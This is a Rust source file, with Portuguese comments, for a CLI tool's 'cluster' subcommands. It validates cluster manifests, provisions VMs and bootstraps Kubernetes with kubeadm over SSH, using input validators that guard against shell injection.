//! `delonix cluster apply -f cloud.yaml` — bootstrap `kubeadm` idempotente
//! sobre SSH, em hosts já vivos (`kind: Cluster`). Não cria VMs — isso é
//! `delonix vm create` (opcionalmente com a imagem dourada de `delonix image
//! --vm build`). Idempotência SEM ficheiro de estado: cada passo verifica a
//! condição real no host (`remote::ssh_check`) antes de agir.
//!
//! **Simplificações desta v1** (ver `CLAUDE.md`): só etcd `stacked`
//! (co-localizado nos control-planes — o default do kubeadm); execução
//! sequencial (não paralela) entre hosts; HA multi-control-plane exige
//! `spec.controlPlaneEndpoint` explícito (kubeadm precisa de um endpoint
//! estável — LB/VIP — à frente de vários control-planes).

use std::path::PathBuf;
use std::process::Command;
use std::time::{Duration, Instant};

use clap::Subcommand;
use clap_complete::engine::ArgValueCandidates;
use delonix_runtime_core::{Error, Result};
use serde::Deserialize;

use super::manifest::{self, ManifestDoc};
use super::remote::{self, SshTarget};
use super::util::state_root;
use super::vmimage::VmImageStore;
use super::{k8s_recipes, vm as vm_cmd, vmimage};

#[derive(Debug, Deserialize)]
struct SshSpec {
    #[serde(default = "default_ssh_user")]
    user: String,
    /// `keyPath` é o nome canónico (o dos templates); `key` mantém-se aceite
    /// para não partir manifestos escritos antes desta reestruturação.
    #[serde(alias = "keyPath")]
    key: Option<PathBuf>,
    #[serde(default)]
    port: Option<u16>,
}

/// `Default` MANUAL (não derivado) de propósito: o derive daria `user: ""`, e
/// como `ClusterSpec.ssh` é `#[serde(default)]`, um manifesto SEM bloco `ssh:`
/// ficaria com utilizador VAZIO em vez de `delonix` — o `default_ssh_user` só
/// se aplica quando o bloco existe mas lhe falta o campo. Mesmo padrão de
/// `EtcdSpec`/`KindModeSpec`.
impl Default for SshSpec {
    fn default() -> Self {
        SshSpec { user: default_ssh_user(), key: None, port: None }
    }
}

fn default_ssh_user() -> String {
    "delonix".to_string()
}

#[derive(Debug, Deserialize)]
struct EtcdSpec {
    #[serde(default = "default_etcd_mode")]
    mode: String,
}

impl Default for EtcdSpec {
    fn default() -> Self {
        EtcdSpec { mode: default_etcd_mode() }
    }
}

fn default_etcd_mode() -> String {
    "stacked".to_string()
}

#[derive(Debug, Clone, Deserialize)]
struct HostSpec {
    /// `address` é o nome canónico nos templates; `ip` mantém-se por
    /// compatibilidade com os manifestos anteriores.
    #[serde(alias = "address")]
    ip: String,
    hostname: Option<String>,
}

impl HostSpec {
    fn label(&self) -> String {
        self.hostname.clone().unwrap_or_else(|| self.ip.clone())
    }
}

#[derive(Debug, Deserialize)]
struct ClusterSpec {
    /// **O discriminador**: `kind` (containers aqui), `vm` (VMs douradas) ou
    /// `ssh` (hosts remotos já vivos). Um só Kind, três caminhos — os campos
    /// comuns (k8sVersion/podSubnet/cni) partilham-se, os específicos vivem no
    /// bloco do modo.
    #[serde(default = "default_mode")]
    mode: String,
    #[serde(default)]
    ssh: SshSpec,
    #[serde(default)]
    etcd: EtcdSpec,
    #[serde(rename = "controlPlaneEndpoint")]
    control_plane_endpoint: Option<String>,
    #[serde(rename = "controlPlane", default)]
    control_plane: NodesSpec,
    #[serde(default)]
    workers: NodesSpec,
    #[serde(rename = "k8sVersion")]
    k8s_version: Option<String>,
    #[serde(rename = "podSubnet", default = "default_pod_subnet")]
    pod_subnet: String,
    #[serde(rename = "serviceSubnet", default = "default_service_subnet")]
    service_subnet: String,
    /// `default` = a CNI da imagem (kindnet); `none` = não instalar nenhuma.
    #[serde(default = "default_cni")]
    cni: String,
    #[serde(default)]
    kind: KindModeSpec,
    #[serde(default)]
    vm: VmModeSpec,
}

/// `Default` MANUAL, espelhando EXACTAMENTE os `#[serde(default = ...)]` de
/// cima — um `ClusterSpec::default()` tem de ser indistinguível de um manifesto
/// vazio desserializado. Existe sobretudo para os testes poderem usar
/// `ClusterSpec { campo: x, ..Default::default() }` e não voltarem a partir de
/// cada vez que o schema ganha um campo novo.
impl Default for ClusterSpec {
    fn default() -> Self {
        ClusterSpec {
            mode: default_mode(),
            ssh: SshSpec::default(),
            etcd: EtcdSpec::default(),
            control_plane_endpoint: None,
            control_plane: NodesSpec::default(),
            workers: NodesSpec::default(),
            k8s_version: None,
            pod_subnet: default_pod_subnet(),
            service_subnet: default_service_subnet(),
            cni: default_cni(),
            kind: KindModeSpec::default(),
            vm: VmModeSpec::default(),
        }
    }
}

fn default_mode() -> String {
    "kind".to_string()
}
fn default_cni() -> String {
    "default".to_string()
}

/// Os nós de um papel. **Unifica os três modos**: `kind`/`vm` dizem quantos
/// (`replicas`), `ssh` diz quais (`hosts`) — porque lá as máquinas já existem e
/// nós não as criamos.
#[derive(Debug, Default, Deserialize)]
struct NodesSpec {
    #[serde(default)]
    replicas: Option<u32>,
    #[serde(default)]
    hosts: Vec<HostSpec>,
}

impl NodesSpec {
    /// Quantos nós este papel pede, seja como for que foram declarados.
    fn count(&self) -> u32 {
        if !self.hosts.is_empty() {
            self.hosts.len() as u32
        } else {
            self.replicas.unwrap_or(0)
        }
    }
}

/// Bloco `spec.kind` — só lido no `mode: kind`.
#[derive(Debug, Deserialize)]
struct KindModeSpec {
    #[serde(default = "default_node_image")]
    image: String,
    #[serde(rename = "apiServerPort")]
    api_server_port: Option<u16>,
}

impl Default for KindModeSpec {
    fn default() -> Self {
        KindModeSpec { image: default_node_image(), api_server_port: None }
    }
}

fn default_node_image() -> String {
    super::kindmode::DEFAULT_NODE_IMAGE.to_string()
}


/// Bloco `spec.vm` — só lido no `mode: vm`.
#[derive(Debug, Default, Deserialize)]
struct VmModeSpec {
    image: Option<String>,
    network: Option<String>,
    #[serde(default)]
    vcpus: Option<u32>,
    #[serde(default)]
    memory: Option<String>,
    #[serde(rename = "sshKey", default)]
    ssh_key: Option<PathBuf>,
    #[serde(rename = "bootTimeout", default)]
    boot_timeout: Option<String>,
}

fn default_pod_subnet() -> String {
    "10.244.0.0/16".to_string()
}
fn default_service_subnet() -> String {
    "10.96.0.0/12".to_string()
}

/// `host[:porta]` — só o alfabeto de um hostname/IPv4/IPv6 + porta. Recusa
/// vazio e qualquer coisa que comece por `-`/`:` (evita ambiguidade com
/// flags). **Crítico para segurança**: este valor entra directamente num
/// `format!` que vira o CORPO de um comando `bash -c` remoto (`kubeadm
/// init --control-plane-endpoint=...`, ver `kubeadm_init`/`kubeadm_join`) —
/// sem esta validação, um manifesto malicioso injecta comandos arbitrários
/// como root no host remoto (`;`/`` ` ``/`$()`/`|` não são bloqueados por
/// `remote::shell_quote`, que só protege a fronteira ssh→bash-c local, não o
/// CONTEÚDO do script). Achado de auditoria de segurança, ver CLAUDE.md.
fn valid_endpoint(s: &str) -> bool {
    !s.is_empty()
        && !matches!(s.chars().next(), Some('-') | Some(':'))
        && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | ':'))
}

/// CIDR simples (`10.244.0.0/16`) — só dígitos/`.`/`/`. Mesma justificação
/// de segurança de [`valid_endpoint`] (usado em `--pod-network-cidr`/
/// `--service-cidr` do `kubeadm init`).
fn valid_cidr(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_digit() || matches!(c, '.' | '/'))
}

/// Versão do Kubernetes (`1.31` ou `1.31.2`) — só dígitos/`.`. Mesma
/// justificação de segurança de [`valid_endpoint`] (usado em
/// `--kubernetes-version` do `kubeadm init` E no repositório apt de
/// `k8s_recipes::k8s_host_recipes`, corrido em TODOS os hosts).
pub(crate) fn valid_version(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_digit() || c == '.')
}

fn validate(spec: &ClusterSpec) -> Result<()> {
    if !matches!(spec.mode.as_str(), "kind" | "vm" | "ssh") {
        return Err(Error::Invalid(format!(
            "spec.mode '{}' inválido — usa `kind` (containers locais), `vm` (VMs douradas) ou \
             `ssh` (hosts remotos já vivos)",
            spec.mode
        )));
    }
    if spec.mode == "ssh" && spec.control_plane.hosts.is_empty() {
        return Err(Error::Invalid(
            "spec.mode `ssh` exige `spec.controlPlane.hosts` — este modo NÃO cria máquinas, \
             elas têm de existir e estar alcançáveis".into(),
        ));
    }
    if spec.mode != "ssh" && !spec.control_plane.hosts.is_empty() {
        return Err(Error::Invalid(format!(
            "spec.controlPlane.hosts só faz sentido no `mode: ssh` (aqui é `{}`) — nos modos \
             kind/vm usa `replicas`, que é o delonix que cria os nós",
            spec.mode
        )));
    }
    if spec.etcd.mode != "stacked" {
        return Err(Error::Invalid(format!(
            "etcd.mode '{}' não suportado nesta versão — só 'stacked' (etcd externo fica para \
             uma iteração seguinte, ver CLAUDE.md)",
            spec.etcd.mode
        )));
    }
    if spec.control_plane.count() == 0 {
        return Err(Error::Invalid(
            "spec.controlPlane vazio — pelo menos 1 nó obrigatório (`replicas: 1` ou 1 host)".into(),
        ));
    }
    if spec.control_plane.count() > 1 && spec.control_plane_endpoint.is_none() {
        return Err(Error::Invalid(
            "spec.controlPlaneEndpoint é obrigatório com mais de 1 control-plane (kubeadm \
             precisa de um endpoint estável — LB/VIP — à frente deles; não inventamos um)"
                .into(),
        ));
    }
    if let Some(ep) = &spec.control_plane_endpoint {
        if !valid_endpoint(ep) {
            return Err(Error::Invalid(format!("spec.controlPlaneEndpoint '{ep}' inválido (só host/IP[:porta])")));
        }
    }
    if !valid_cidr(&spec.pod_subnet) {
        return Err(Error::Invalid(format!("spec.podSubnet '{}' inválido (formato CIDR esperado)", spec.pod_subnet)));
    }
    if !valid_cidr(&spec.service_subnet) {
        return Err(Error::Invalid(format!("spec.serviceSubnet '{}' inválido (formato CIDR esperado)", spec.service_subnet)));
    }
    if let Some(v) = &spec.k8s_version {
        if !valid_version(v) {
            return Err(Error::Invalid(format!("spec.k8sVersion '{v}' inválido (só dígitos e pontos, ex.: '1.31')")));
        }
    }
    for h in spec.control_plane.hosts.iter().chain(spec.workers.hosts.iter()) {
        if !valid_endpoint(&h.ip) {
            return Err(Error::Invalid(format!("host '{}' tem ip inválido: '{}'", h.label(), h.ip)));
        }
    }
    Ok(())
}

fn target_for(host: &HostSpec, ssh: &SshSpec) -> SshTarget {
    SshTarget { host: host.ip.clone(), user: ssh.user.clone(), key: ssh.key.clone() }
}

// `Kubeadm` é maior que `Apply` (muitos flags opcionais de provisionamento) —
// mesma justificação do `#[allow]` já usado em `VmCmd`/`Cmd` (enum de CLI
// parseado uma vez por invocação, não um hot-path).
#[allow(clippy::large_enum_variant)]
#[derive(Subcommand)]
pub enum ClusterCmd {
    /// Inicializa um projecto com os manifestos de cluster (kind/vm/ssh) — ficheiros JÁ PREENCHIDOS (imagens
    /// incluídas), prontos a usar sem editar nada.
    Init {
        /// Directório do projecto (default: o actual).
        #[arg(default_value = ".")]
        dir: PathBuf,
        /// Nome do projecto (default: o nome do directório).
        #[arg(long)]
        name: Option<String>,
        /// Imagem a usar. Omitir = preenche com a imagem por omissão.
        #[arg(long)]
        image: Option<String>,
        /// Substitui ficheiros já existentes.
        #[arg(long)]
        force: bool,
    },
    /// Cria um cluster Kubernetes local **sem manifesto e sem Docker** (modo
    /// kind nativo): arranca os nós `kindest/node` no próprio motor Delonix e
    /// faz o bootstrap com `kubeadm`. Sem flags = 1 control-plane pronto a usar.
    Create {
        /// Nome do cluster (prefixo dos nós e do kubeconfig). Omitir = inventa
        /// um (rei + lugar de Angola), para dois `create` seguidos não colidirem.
        #[arg(long)]
        name: Option<String>,
        /// Porta do host para o apiserver. Omitir = o delonix escolhe uma livre
        /// (tenta a 6443; se estiver tomada por outro cluster, usa uma alta).
        #[arg(long)]
        api_port: Option<u16>,
        /// Nós worker a juntar (0 = só control-plane, sem taint — agenda tudo).
        #[arg(long, default_value_t = 0)]
        workers: u32,
        /// Control-planes do cluster (default 1). Mais que 1 exige um endpoint
        /// estável à frente deles (LB) — ver o erro se pedires >1.
        #[arg(long, default_value_t = 1)]
        control_planes: u32,
        /// Imagem do nó (default: `kindest/node` fixada por digest).
        #[arg(long)]
        image: Option<String>,
        #[arg(long, default_value = "10.244.0.0/16")]
        pod_subnet: String,
        #[arg(long, default_value = "10.96.0.0/12")]
        service_subnet: String,
        /// `default` (kindnet, da própria imagem) ou `none` (nó fica NotReady
        /// até aplicares a tua — comportamento do kubeadm puro).
        #[arg(long, default_value = "default")]
        cni: String,
    },
    /// Lista os clusters e o estado dos seus nós.
    #[command(visible_alias = "list")]
    Ls,
    /// Remove um cluster do modo kind (pára e apaga os nós + kubeconfig).
    Delete {
        #[arg(long, default_value = "delonix", add = ArgValueCandidates::new(super::complete::clusters))]
        name: String,
    },
    /// Aplica o(s) documento(s) `kind: Cluster` de um manifesto.
    Apply {
        #[arg(short = 'f', long = "file")]
        file: Option<PathBuf>,
    },
    /// Provisiona VMs (imagem VM dourada) + bootstrap `kubeadm` — do zero a
    /// um cluster a funcionar, sem escrever um manifesto à mão.
    Kubeadm {
        #[arg(long)]
        name: String,
        #[arg(long, default_value_t = 1)]
        control_plane: u32,
        #[arg(long, default_value_t = 2)]
        workers: u32,
        /// Tag da imagem VM dourada (`delonix image --vm ls`). Omitir = usa a
        /// única imagem local existente.
        #[arg(long = "vm-image")]
        vm_image: Option<String>,
        /// Rede já criada (`delonix network create`) — sem default mágico.
        #[arg(long)]
        network: String,
        /// Chave SSH privada a usar. Omitir = gera um par ed25519 novo em
        /// `<root>/clusters/<name>/id_ed25519`.
        #[arg(long = "ssh-key")]
        ssh_key: Option<PathBuf>,
        #[arg(long, default_value_t = 2)]
        vcpus: u32,
        #[arg(long, default_value = "2G")]
        memory: String,
        #[arg(long = "k8s-version")]
        k8s_version: Option<String>,
        #[arg(long, default_value = "10.244.0.0/16")]
        pod_subnet: String,
        #[arg(long, default_value = "10.96.0.0/12")]
        service_subnet: String,
        /// Segundos a esperar por cada VM ficar alcançável por SSH.
        #[arg(long, default_value_t = 300)]
        boot_timeout: u64,
    },
}

pub fn run(action: ClusterCmd) -> Result<()> {
    if let ClusterCmd::Init { dir, name, image, force } = action {
        return cmd_init(super::scaffold::Target::Cluster, dir, name, image, force);
    }
    // Modo kind nativo — não toca em SSH/VMs nem precisa de manifesto.
    match action {
        // Tratado no topo de `run` (faz `return`).
        ClusterCmd::Init { .. } => unreachable!("tratado acima"),
        ClusterCmd::Create { ref name, api_port, workers, control_planes, ref image, ref pod_subnet, ref service_subnet, ref cni } => {
            let (images, store) = super::util::open_stores()?;
            let name = match name {
                Some(n) => n.clone(),
                None => super::kindmode::random_cluster_name(&store)?,
            };
            return super::kindmode::create(
                &images,
                &store,
                &super::kindmode::KindCluster {
                    name,
                    image: image.clone().unwrap_or_else(|| super::kindmode::DEFAULT_NODE_IMAGE.to_string()),
                    api_port,
                    pod_subnet: pod_subnet.clone(),
                    service_subnet: service_subnet.clone(),
                    control_planes,
                    cni: cni.clone(),
                    k8s_version: None,
                    workers,
                },
            );
        }
        ClusterCmd::Ls => {
            let (_, store) = super::util::open_stores()?;
            return super::kindmode::list(&store);
        }
        ClusterCmd::Delete { ref name } => {
            let (images, store) = super::util::open_stores()?;
            return super::kindmode::delete(&images, &store, name);
        }
        _ => {}
    }
    match action {
        // Já tratados acima (modo kind nativo / init) — o topo de `run` faz `return`.
        ClusterCmd::Create { .. } | ClusterCmd::Delete { .. } | ClusterCmd::Init { .. } | ClusterCmd::Ls => {
            unreachable!("tratados acima")
        }
        ClusterCmd::Apply { file } => {
            let path = manifest::resolve_path(file)?;
            let docs = manifest::load(&path)?;
            apply(&docs)
        }
        ClusterCmd::Kubeadm {
            name,
            control_plane,
            workers,
            vm_image,
            network,
            ssh_key,
            vcpus,
            memory,
            k8s_version,
            pod_subnet,
            service_subnet,
            boot_timeout,
        } => provision_and_apply(ProvisionArgs {
            name,
            control_plane,
            workers,
            vm_image,
            network,
            ssh_key,
            vcpus,
            memory,
            k8s_version,
            pod_subnet,
            service_subnet,
            boot_timeout,
        }),
    }
}

pub fn apply(docs: &[ManifestDoc]) -> Result<()> {
    for doc in manifest::of_kind(docs, "Cluster") {
        let name = &doc.metadata.name;
        let spec: ClusterSpec = manifest::spec_of(doc)?;
        validate(&spec)?;
        apply_one(name, &spec)?;
    }
    Ok(())
}

fn apply_one(name: &str, spec: &ClusterSpec) -> Result<()> {
    validate(spec)?;
    // O `spec.mode` escolhe o caminho — os campos comuns (k8sVersion/podSubnet/
    // cni) valem nos três; só o bloco específico do modo muda.
    match spec.mode.as_str() {
        "kind" => return apply_kind(name, spec),
        "vm" => return apply_vm(name, spec),
        _ => {} // `ssh` segue abaixo (o caminho original)
    }
    apply_ssh(name, spec)
}

/// `mode: kind` — nós em containers nesta máquina (ver `cmd::kindmode`).
fn apply_kind(name: &str, spec: &ClusterSpec) -> Result<()> {
    if spec.control_plane.count() > 1 {
        return Err(Error::Invalid(
            "`mode: kind` só suporta 1 control-plane por agora (HA precisa de um endpoint \
             estável à frente dos nós — ver cluster-ssh.yaml)"
                .into(),
        ));
    }
    let (images, store) = super::util::open_stores()?;
    super::kindmode::create(
        &images,
        &store,
        &super::kindmode::KindCluster {
            name: name.to_string(),
            image: spec.kind.image.clone(),
            api_port: spec.kind.api_server_port,
            pod_subnet: spec.pod_subnet.clone(),
            service_subnet: spec.service_subnet.clone(),
            cni: spec.cni.clone(),
            k8s_version: spec.k8s_version.clone(),
            workers: spec.workers.count(),
            // O `> 1` já foi recusado acima, com a mesma razão.
            control_planes: 1,
        },
    )
}

/// `mode: vm` — provisiona VMs da imagem dourada e faz o bootstrap por SSH.
/// Reaproveita o `provision_and_apply` do `cluster kubeadm` (zero duplicação).
fn apply_vm(name: &str, spec: &ClusterSpec) -> Result<()> {
    let network = spec.vm.network.clone().ok_or_else(|| {
        Error::Invalid("`mode: vm` exige `spec.vm.network` (cria-a antes com `delonix network create`)".into())
    })?;
    let boot_timeout = spec
        .vm
        .boot_timeout
        .as_deref()
        .map(|t| t.trim_end_matches('s').parse::<u64>().unwrap_or(300))
        .unwrap_or(300);
    provision_and_apply(ProvisionArgs {
        name: name.to_string(),
        control_plane: spec.control_plane.count(),
        workers: spec.workers.count(),
        vm_image: spec.vm.image.clone(),
        network,
        ssh_key: spec.vm.ssh_key.clone(),
        vcpus: spec.vm.vcpus.unwrap_or(2),
        memory: spec.vm.memory.clone().unwrap_or_else(|| "2G".to_string()),
        k8s_version: spec.k8s_version.clone(),
        pod_subnet: spec.pod_subnet.clone(),
        service_subnet: spec.service_subnet.clone(),
        boot_timeout,
    })
}

/// `mode: ssh` — hosts remotos JÁ vivos (o caminho original, inalterado).
fn apply_ssh(name: &str, spec: &ClusterSpec) -> Result<()> {
    let cri_bin = vmimage::resolve_cri_bin(None)?;
    let cri_service = vmimage::workspace_dist_file("delonix-cri.service")?;

    let all_hosts: Vec<&HostSpec> = spec.control_plane.hosts.iter().chain(spec.workers.hosts.iter()).collect();
    println!("cluster/{name}: a preparar {} host(s)...", all_hosts.len());
    for h in &all_hosts {
        let target = target_for(h, &spec.ssh);
        prepare_host(&target, &h.label(), spec.k8s_version.as_deref(), &cri_bin, &cri_service)?;
    }

    let cp1 = &spec.control_plane.hosts[0];
    let cp1_target = target_for(cp1, &spec.ssh);
    let endpoint = spec.control_plane_endpoint.clone().unwrap_or_else(|| cp1.ip.clone());
    let info = kubeadm_init(&cp1_target, &cp1.label(), &endpoint, spec)?;

    for h in &spec.control_plane.hosts[1..] {
        let target = target_for(h, &spec.ssh);
        kubeadm_join(&target, &h.label(), &endpoint, &info, true)?;
    }
    for h in &spec.workers.hosts {
        let target = target_for(h, &spec.ssh);
        kubeadm_join(&target, &h.label(), &endpoint, &info, false)?;
    }

    fetch_kubeconfig(&cp1_target, name)?;
    println!("cluster/{name}: pronto");
    Ok(())
}

// ---------------------------------------------------------------------------
// `delonix cluster kubeadm` — provisiona VMs + chama `apply_one`
// ---------------------------------------------------------------------------

struct ProvisionArgs {
    name: String,
    control_plane: u32,
    workers: u32,
    vm_image: Option<String>,
    network: String,
    ssh_key: Option<PathBuf>,
    vcpus: u32,
    memory: String,
    k8s_version: Option<String>,
    pod_subnet: String,
    service_subnet: String,
    boot_timeout: u64,
}

/// Nomes determinísticos das VMs de um papel (`<cluster>-cp1`, `<cluster>-w1`, ...).
fn vm_names(cluster_name: &str, role: &str, count: u32) -> Vec<String> {
    (1..=count).map(|i| format!("{cluster_name}-{role}{i}")).collect()
}

/// Resolve a tag da imagem VM dourada a usar: explícita, ou a única existente
/// localmente (erro claro se houver 0 ou mais de 1 — nunca escolhe às cegas
/// entre várias).
fn resolve_vm_image(store: &VmImageStore, explicit: Option<String>) -> Result<String> {
    if let Some(tag) = explicit {
        return Ok(tag);
    }
    let mut images = store.list()?;
    match images.len() {
        0 => Err(Error::Invalid(
            "sem imagens VM locais — corre `delonix image --vm build` primeiro, ou passa --vm-image <tag>".into(),
        )),
        1 => Ok(images.remove(0).name),
        n => Err(Error::Invalid(format!(
            "há {n} imagens VM locais — especifica qual usar com --vm-image <tag> (`delonix image --vm ls`)"
        ))),
    }
}

/// Chave SSH privada a usar: a explícita, ou gera um par ed25519 novo em
/// `<root>/clusters/<name>/id_ed25519` (`ssh-keygen` não-interactivo, sem
/// passphrase — automação, mesmo espírito do `BatchMode=yes` já usado em
/// `remote.rs`). Devolve `(caminho_privada, texto_publica)`.
fn generate_or_load_ssh_key(name: &str, explicit: Option<PathBuf>) -> Result<(PathBuf, String)> {
    if let Some(key) = explicit {
        let pub_path = key.with_extension("pub");
        let public = std::fs::read_to_string(&pub_path)
            .map_err(|e| Error::Invalid(format!("não consegui ler a chave pública '{}': {e}", pub_path.display())))?;
        return Ok((key, public.trim().to_string()));
    }
    let dir = state_root().join("clusters").join(name);
    std::fs::create_dir_all(&dir)?;
    let key_path = dir.join("id_ed25519");
    if !key_path.exists() {
        let status = Command::new("ssh-keygen")
            .args(["-t", "ed25519", "-N", "", "-f"])
            .arg(&key_path)
            .args(["-C", &format!("delonix-cluster-{name}")])
            .status()
            .map_err(|e| Error::Invalid(format!("a correr ssh-keygen: {e}")))?;
        if !status.success() {
            return Err(Error::Invalid("ssh-keygen falhou".into()));
        }
    }
    let public = std::fs::read_to_string(key_path.with_extension("pub"))?;
    Ok((key_path, public.trim().to_string()))
}

/// Espera uma VM ficar alcançável por SSH: primeiro o IP (reconciliado pelo
/// backend — DHCP/`domifaddr`, tipicamente rápido), depois um `ssh_check`
/// real (o boot do SO/arranque do sshd demora mais). Devolve o IP.
fn wait_for_vm_ssh_ready(vm_name: &str, ssh: &SshSpec, timeout: Duration) -> Result<String> {
    let base = state_root();
    let deadline = Instant::now() + timeout;

    let ip = loop {
        let vm = delonix_vm::status(&base, vm_name)?;
        if let Some(ip) = vm.ip {
            break ip;
        }
        if Instant::now() >= deadline {
            return Err(Error::Invalid(format!("VM '{vm_name}': sem IP atribuído dentro do --boot-timeout")));
        }
        std::thread::sleep(Duration::from_secs(3));
    };

    let target = SshTarget { host: ip.clone(), user: ssh.user.clone(), key: ssh.key.clone() };
    loop {
        if remote::ssh_check(&target, "true") {
            return Ok(ip);
        }
        if Instant::now() >= deadline {
            return Err(Error::Invalid(format!(
                "VM '{vm_name}' (ip={ip}): SSH não respondeu dentro do --boot-timeout — o boot pode ainda estar em curso"
            )));
        }
        std::thread::sleep(Duration::from_secs(5));
    }
}

fn provision_and_apply(args: ProvisionArgs) -> Result<()> {
    if args.control_plane == 0 {
        return Err(Error::Invalid("--control-plane tem de ser >= 1".into()));
    }
    let base = state_root();
    let vm_store = VmImageStore::open(&base)?;
    let image_tag = resolve_vm_image(&vm_store, args.vm_image.clone())?;
    let disk = vm_store.qcow2_path(&image_tag);
    if !disk.exists() {
        return Err(Error::Invalid(format!("imagem VM '{image_tag}' não tem qcow2 em disco ({})", disk.display())));
    }

    let (ssh_key_path, ssh_public) = generate_or_load_ssh_key(&args.name, args.ssh_key.clone())?;
    let ssh = SshSpec { user: "delonix".to_string(), key: Some(ssh_key_path), port: None };
    let timeout = Duration::from_secs(args.boot_timeout);

    let cp_names = vm_names(&args.name, "cp", args.control_plane);
    let worker_names = vm_names(&args.name, "w", args.workers);

    println!(
        "cluster/{}: a provisionar {} control-plane(s) + {} worker(s) a partir de '{image_tag}'...",
        args.name,
        cp_names.len(),
        worker_names.len()
    );

    let mut control_plane = Vec::with_capacity(cp_names.len());
    for vm_name in &cp_names {
        let ip = create_and_wait(vm_name, &disk, &args, &ssh_public, &ssh, timeout)?;
        control_plane.push(HostSpec { ip, hostname: Some(vm_name.clone()) });
    }
    let mut worker_hosts = Vec::with_capacity(worker_names.len());
    for vm_name in &worker_names {
        let ip = create_and_wait(vm_name, &disk, &args, &ssh_public, &ssh, timeout)?;
        worker_hosts.push(HostSpec { ip, hostname: Some(vm_name.clone()) });
    }

    let control_plane_endpoint = if control_plane.len() == 1 {
        None
    } else {
        return Err(Error::Invalid(
            "mais de 1 control-plane pedido, mas `delonix cluster kubeadm` ainda não provisiona \
             um endpoint estável (LB/VIP) automaticamente — usa `delonix cluster apply` com um \
             `controlPlaneEndpoint` externo já preparado, ou pede só 1 control-plane"
                .into(),
        ));
    };

    // O `cluster kubeadm` (flags, sem manifesto) constrói o MESMO ClusterSpec que
    // um `apply -f` construiria — daí passar pelo `validate`/`apply_one` iguais.
    let spec = ClusterSpec {
        mode: "ssh".to_string(), // as VMs já foram criadas acima; daqui p/ a frente é SSH
        ssh,
        etcd: EtcdSpec::default(),
        control_plane_endpoint,
        control_plane: NodesSpec { replicas: None, hosts: control_plane },
        workers: NodesSpec { replicas: None, hosts: worker_hosts },
        k8s_version: args.k8s_version,
        pod_subnet: args.pod_subnet,
        service_subnet: args.service_subnet,
        cni: default_cni(),
        kind: KindModeSpec::default(),
        vm: VmModeSpec::default(),
    };
    validate(&spec)?;
    apply_one(&args.name, &spec)
}

fn create_and_wait(
    vm_name: &str,
    disk: &std::path::Path,
    args: &ProvisionArgs,
    ssh_public: &str,
    ssh: &SshSpec,
    timeout: Duration,
) -> Result<String> {
    println!("cluster/{}: a criar VM {vm_name}...", args.name);
    let seed = vm_cmd::generate_seed_iso(vm_name, Some(vm_name), std::slice::from_ref(&ssh_public.to_string()), None)?;
    let cfg = delonix_vm::VmConfig {
        name: vm_name.to_string(),
        disk: disk.to_string_lossy().into_owned(),
        vcpus: args.vcpus,
        memory: args.memory.clone(),
        network: args.network.clone(),
        kernel: None,
        initrd: None,
        firmware: None,
        cmdline: None,
        seed: Some(seed.to_string_lossy().into_owned()),
        restart_policy: None,
        hugepages: false,
        cpu_affinity: None,
        devices: Vec::new(),
        backend: None,
        net_mode: None,
        bridge: None,
    };
    delonix_vm::create(&state_root(), &cfg)?;
    println!("cluster/{}: a aguardar SSH em {vm_name}...", args.name);
    let ip = wait_for_vm_ssh_ready(vm_name, ssh, timeout)?;
    println!("cluster/{}: {vm_name} pronta (ip={ip})", args.name);
    Ok(ip)
}

fn prepare_host(
    target: &SshTarget,
    label: &str,
    k8s_version: Option<&str>,
    cri_bin: &std::path::Path,
    cri_service: &std::path::Path,
) -> Result<()> {
    for r in k8s_recipes::k8s_host_recipes(k8s_version, &[]) {
        if remote::ssh_check(target, &r.check) {
            println!("[{label}] {}: já satisfeito (SKIP)", r.name);
            continue;
        }
        println!("[{label}] {}: a aplicar...", r.name);
        remote::ssh_run(target, &r.apply)?;
        println!("[{label}] {}: OK", r.name);
    }

    if remote::ssh_check(target, "systemctl is-active --quiet delonix-cri") {
        println!("[{label}] delonix-cri: já satisfeito (SKIP)");
    } else {
        println!("[{label}] delonix-cri: a instalar...");
        remote::scp_to(target, cri_bin, "/tmp/delonix-cri")?;
        remote::ssh_run(target, "mv /tmp/delonix-cri /usr/local/bin/delonix-cri && chmod +x /usr/local/bin/delonix-cri")?;
        remote::scp_to(target, cri_service, "/tmp/delonix-cri.service")?;
        remote::ssh_run(
            target,
            "mv /tmp/delonix-cri.service /etc/systemd/system/delonix-cri.service && \
             systemctl daemon-reload && systemctl enable --now delonix-cri",
        )?;
        println!("[{label}] delonix-cri: OK");
    }
    Ok(())
}

struct JoinInfo {
    token: String,
    ca_cert_hash: String,
    certificate_key: Option<String>,
}

fn kubeadm_init(cp1: &SshTarget, label: &str, endpoint: &str, spec: &ClusterSpec) -> Result<JoinInfo> {
    if remote::ssh_check(cp1, "test -f /etc/kubernetes/admin.conf") {
        println!("[{label}] kubeadm init: já satisfeito (SKIP) — a recuperar credenciais de join...");
        return recover_join_info(cp1);
    }
    let k8s_ver_flag = spec.k8s_version.as_ref().map(|v| format!(" --kubernetes-version=v{v}")).unwrap_or_default();
    let cmd = format!(
        "kubeadm init --control-plane-endpoint={endpoint} --upload-certs \
         --pod-network-cidr={} --service-cidr={}{k8s_ver_flag}",
        spec.pod_subnet, spec.service_subnet
    );
    println!("[{label}] kubeadm init: a correr (pode demorar alguns minutos)...");
    let out = remote::ssh_run(cp1, &cmd)?;
    println!("[{label}] kubeadm init: OK");
    parse_join_info(&out)
}

fn recover_join_info(cp1: &SshTarget) -> Result<JoinInfo> {
    let join_cmd = remote::ssh_run(cp1, "kubeadm token create --print-join-command")?;
    let token = extract_after(&join_cmd, "--token ").ok_or_else(|| Error::Invalid("sem --token no join-command".into()))?;
    let ca_cert_hash = extract_after(&join_cmd, "--discovery-token-ca-cert-hash ")
        .ok_or_else(|| Error::Invalid("sem --discovery-token-ca-cert-hash no join-command".into()))?;
    let cert_key_out = remote::ssh_run(cp1, "kubeadm init phase upload-certs --upload-certs")?;
    let certificate_key = extract_after(&cert_key_out, "Using certificate key:\n").or_else(|| {
        // formato alternativo (linha única "certificate key: <hex>") consoante a versão.
        extract_after(&cert_key_out, "certificate key:")
    });
    Ok(JoinInfo { token, ca_cert_hash, certificate_key })
}

/// Extrai o kubeadm init/join output: `token`/`discovery-token-ca-cert-hash`
/// vêm de `--flag valor`; `certificate-key` idem. Função pura, testada com
/// uma amostra real de output.
